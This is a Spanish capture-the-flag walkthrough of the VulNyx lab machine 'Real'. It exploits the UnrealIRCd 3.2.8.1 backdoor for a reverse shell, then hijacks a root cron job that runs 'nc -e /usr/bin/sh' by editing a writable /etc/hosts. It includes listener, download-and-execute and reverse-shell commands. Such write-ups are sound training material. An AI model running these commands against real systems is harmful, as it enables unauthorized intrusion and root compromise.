# WriteUp: Real | VulNyx

## Fase 1: Reconocimiento Inicial

Como siempre, mi primer paso fue realizar un reconocimiento exhaustivo de la máquina objetivo. Comencé con un escaneo rápido de `nmap` para descubrir todos los puertos TCP abiertos.

```bash
nmap -n -Pn -sS -p- --min-rate 5000 192.168.56.30

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6667/tcp open  irc
6697/tcp open  ircs-u
8067/tcp open  infi-async
```

El escaneo reveló varios puertos interesantes, incluyendo SSH, HTTP y tres puertos asociados con IRC (Internet Relay Chat). Para obtener más detalles, ejecuté un segundo escaneo más profundo para identificar las versiones de los servicios.

```bash
nmap -sVC -p22,80,6667,6697,8067 192.168.56.30

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
...
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
6667/tcp open  irc     UnrealIRCd
6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd
```

El hallazgo clave aquí fue el software del servidor IRC: UnrealIRCd. Este software, especialmente en versiones antiguas, es conocido por haber tenido vulnerabilidades críticas. El servidor web en el puerto 80 mostraba la página por defecto de Apache, y un escaneo con `gobuster` no reveló ningún directorio o archivo de interés, por lo que centré toda mi atención en el servicio IRC.

## Fase 2: Explotación del Backdoor de UnrealIRCd

No conocía a fondo el servicio IRC, pero una búsqueda rápida sobre "UnrealIRCd exploit" me llevó a una de las vulnerabilidades más famosas: un backdoor intencional introducido en la versión 3.2.8.1. Este backdoor fue agregado al código fuente oficial por un atacante y permitía la ejecución remota de comandos.

Nmap cuenta con un script específico (`irc-unrealircd-backdoor`) para detectar esta vulnerabilidad. Lo ejecuté para confirmar mis sospechas.

```bash
nmap -p6667 --script="irc-unrealircd-backdoor" 192.168.56.30
```

El script confirmó que el servidor era vulnerable. Con esta confirmación, busqué un exploit público y encontré uno muy conveniente en GitHub. Este exploit simplifica el proceso de enviar el payload malicioso al servidor IRC.

[https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor)

Para recibir la conexión, primero puse un listener de `netcat` en mi máquina atacante en el puerto 4444.

```bash
nc -nlvp 4444
```

Luego, ejecuté el exploit de Python que había descargado, apuntando a la IP de la víctima y al puerto del servicio IRC.

```bash
python3 exploit.py 192.168.56.30 6667 -payload python

# Salida del exploit
Exploit sent successfully!
```

Inmediatamente, recibí una conexión en mi listener, obteniendo una shell en la máquina víctima como el usuario `server`.

```bash
listening on [any] 4444 ...
connect to [192.168.56.22] from (UNKNOWN) [192.168.56.30] 56420
id
uid=1000(server) gid=1000(server) groups=1000(server)
```

La shell que obtuve era básica y no interactiva. Para poder trabajar de manera más cómoda (usar autocompletado, historial, etc.), la actualicé a una TTY completamente funcional siguiendo el procedimiento estándar.

```bash
# 1. Mejorar la shell inicial con Python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Poner el proceso en segundo plano (background)
Ctrl-Z

# 3. Preparar mi terminal local para la TTY
stty raw -echo; fg

# 4. Configurar la terminal remota
export TERM=xterm
reset
```

Con esto, ya tenía una shell estable y completamente funcional para empezar la fase de post-explotación.

## Fase 3: Enumeración Local y Descubrimiento de Vectores

Para acelerar el proceso de búsqueda de vectores de escalada de privilegios, decidí utilizar LinPEAS, un script automatizado que busca malas configuraciones, permisos inusuales y vulnerabilidades conocidas en sistemas Linux.

Primero, levanté un servidor HTTP simple en mi máquina Kali desde el directorio donde tenía el script de LinPEAS.

```bash
# En mi máquina Kali
cd /usr/share/peass/linpeas
python3 -m http.server 80
```

Luego, desde la máquina víctima, navegué al directorio `/tmp` (que casi siempre tiene permisos de escritura), descargué el script y lo ejecuté.

```bash
# En la máquina víctima
cd /tmp
wget http://192.168.56.22/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Después de revisar la extensa salida de LinPEAS, dos hallazgos destacaron inmediatamente:

![](Pasted%20image%2020251127020026.png)

![](Pasted%20image%2020251127020033.png)

1. Capacidades de Linux: El binario `/usr/bin/ping` tenía la capacidad `cap_net_raw+ep`. Esta capacidad permite a un proceso crear "raw sockets", lo cual es necesario para que `ping` envíe paquetes ICMP. Por sí sola, no es una vulnerabilidad grave.
2. Permisos de Archivos: El archivo `/etc/hosts` tenía permisos de escritura para mi usuario (`server`). ¡Esto sí es una vulnerabilidad crítica! El archivo `/etc/hosts` permite mapear nombres de dominio a direcciones IP a nivel de sistema. Tener control sobre él significa que puedo realizar DNS spoofing local, redirigiendo cualquier solicitud de dominio a una IP de mi elección.

La combinación de estos dos hallazgos era mi principal pista. Podía modificar `/etc/hosts` para que un dominio cualquiera apuntara a mi máquina, y luego usar `ping` para verificar que la redirección funcionaba. Aunque esto no me daba privilegios directamente, era una prueba de concepto sólida de que podía secuestrar el tráfico de cualquier proceso que utilizara nombres de dominio.

## Fase 4: Escalada de Privilegios por DNS Spoofing

Sabía que había algo más. Para descubrir qué procesos se ejecutaban en segundo plano, utilicé pspy, una herramienta que monitorea procesos en tiempo real sin necesidad de permisos de root. Es excelente para encontrar tareas `cron` o scripts que se ejecutan periódicamente.

Descargué `pspy64` en la máquina víctima (siguiendo el mismo método que con LinPEAS) y lo ejecuté.

```bash
./pspy64
```

Al poco tiempo, un patrón claro apareció en la salida:

![](Pasted%20image%2020251127020059.png)

Cada minuto, un script llamado `/opt/task` se ejecutaba como UID=0 (root). Dentro de ese script, se ejecutaba un comando `ping` al dominio `shelly.real.nyx`. Esta era la pieza que me faltaba.

Revisé el contenido del script `/opt/task`:

```bash
#!/bin/bash

domain='shelly.real.nyx'

function check(){

       timeout 1 bash -c "/usr/bin/ping -c 1 $domain" > /dev/null 2>&1
   if [ "$(echo $?)" == "0" ]; then
       /usr/bin/nohup nc -e /usr/bin/sh $domain 65000
       exit 0
   else
       exit 1
   fi
}

check
```

El script era una puerta trasera esperando ser activada. Su lógica es simple:

1. Hace `ping` al dominio `shelly.real.nyx`.
2. Si el `ping` es exitoso (código de salida `0`), inmediatamente ejecuta `netcat` para enviar una reverse shell (`/usr/bin/sh`) a ese mismo dominio en el puerto `65000`.

El plan de ataque era ahora evidente. Solo tenía que usar mi permiso de escritura en `/etc/hosts` para hacer que el dominio `shelly.real.nyx` se resolviera a la dirección IP de mi máquina Kali.

Edité el archivo `/etc/hosts`:

```bash
# Agregué la siguiente línea al final del archivo
192.168.56.22   shelly.real.nyx
```

Finalmente, en mi máquina Kali, me puse a la escucha en el puerto `65000`.

```bash
nc -nlvp 65000
```

Esperé menos de un minuto a que la tarea cron se ejecutara. El script `/opt/task`, ahora ejecutándose como `root`, hizo `ping` a `shelly.real.nyx`, mi `ping` respondió, y la condición del `if` se cumplió, lanzando la reverse shell directamente a mi listener.

```bash
listening on [any] 65000 ...
connect to [192.168.56.22] from (UNKNOWN) [192.168.56.31] 45842
id
uid=0(root) gid=0(root) groups=0(root)
```

Con esto, había escalado privilegios y comprometido completamente la máquina.